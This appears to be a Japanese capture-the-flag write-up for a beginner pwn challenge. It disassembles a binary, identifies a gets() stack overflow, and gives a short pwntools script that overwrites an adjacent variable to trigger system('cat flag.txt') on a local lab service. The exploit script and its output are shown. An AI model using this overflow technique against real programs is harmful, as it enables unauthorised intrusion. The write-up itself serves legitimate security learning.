# first 

## access

```
nc localhost 4101
```
main関数が定義されているので読む  
read_flagとかいうめっちゃそれっぽいやつもある

```Assembly:main

[0x004010f0]> pdf @main
            ; DATA XREF from entry0 @ 0x401111
┌ 110: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x30
│           ; var char *s2 @ rbp-0xa
│           0x004011ed      f30f1efa       endbr64
│           0x004011f1      55             push rbp
│           0x004011f2      4889e5         mov rbp, rsp
│           0x004011f5      4883ec30       sub rsp, 0x30
│           0x004011f9      488d3d110e00.  lea rdi, str.What_s_your_name ; 0x402011 ; "What's your name?\n> " ; const char *format
│           0x00401200      b800000000     mov eax, 0
│           0x00401205      e896feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0040120a      488d45d0       lea rax, [s]
│           0x0040120e      4889c7         mov rdi, rax                ; char *s
│           0x00401211      b800000000     mov eax, 0
│           0x00401216      e8b5feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040121b      488d45f6       lea rax, [s2]
│           0x0040121f      4889c6         mov rsi, rax                ; const char *s2
│           0x00401222      488d3dfd0d00.  lea rdi, str.hacked         ; 0x402026 ; "hacked!" ; const char *s1
│           0x00401229      e892feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x0040122e      85c0           test eax, eax
│       ┌─< 0x00401230      750a           jne 0x40123c
│       │   0x00401232      b800000000     mov eax, 0
│       │   0x00401237      e89affffff     call sym.read_flag
│       │   ; CODE XREF from main @ 0x401230
│       └─> 0x0040123c      488d45d0       lea rax, [s]
│           0x00401240      4889c6         mov rsi, rax
│           0x00401243      488d3de40d00.  lea rdi, str.Hello__s       ; 0x40202e ; "Hello %s!!\n" ; const char *format
│           0x0040124a      b800000000     mov eax, 0
│           0x0040124f      e84cfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401254      b800000000     mov eax, 0
│           0x00401259      c9             leave
└           0x0040125a      c3             ret

```

rbp-0x30までスタック領域が確保されている  
変数が2つ、[s]と[s2]がある  

What's your name?を出力してる  
gets関数で入力を[s]に読み込んでる
strcmp("hacked!", [s2])してる  
[s2]がhacked!と一致したらread_flag関数が呼び出される  
くらいのことがわかる

read_flag関数を読む
```Assembly:read_flag

[0x004010f0]> pdf @sym.read_flag
            ; CALL XREF from main @ 0x401237
┌ 23: sym.read_flag ();
│           0x004011d6      f30f1efa       endbr64
│           0x004011da      55             push rbp
│           0x004011db      4889e5         mov rbp, rsp
│           0x004011de      488d3d1f0e00.  lea rdi, str.cat_flag.txt   ; 0x402004 ; "cat flag.txt" ; const char *string
│           0x004011e5      e8a6feffff     call sym.imp.system         ; int system(const char *string)
│           0x004011ea      90             nop
│           0x004011eb      5d             pop rbp
└           0x004011ec      c3             ret

```

``system("cat flag.txt")``するだけ  
この関数を呼び出せばflagに近づける...かも？

read_flag関数を起動するにはmainの[s2]をhacked!必要がある  
けどプログラム内で書き換えてそうなところがない...?

main関数の変数は、
```
; var char *s @ rbp-0x30
; var char *s2 @ rbp-0xa
```
[s]はrbp-0x30、[s2]はrbp-0xaのようにスタックが確保されているので、  
[s]に0x26バイト分にhacked!を続けた入力をすればスタックオーバーフローするかもしれない  

```python:solve.py
from pwn import *

io = remote('localhost', 4101)
io.sendline('A'*0x26 + 'hacked!')
io.interactive()
```

```
[vagrant@fedora32 first]$ python solve.py
[+] Opening connection to localhost on port 4101: Done
[*] Switching to interactive mode
What's your name?
> flag{Y0u_kn0w_st4ck_0v3r_wr1t3}
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhacked!!!
```

できた!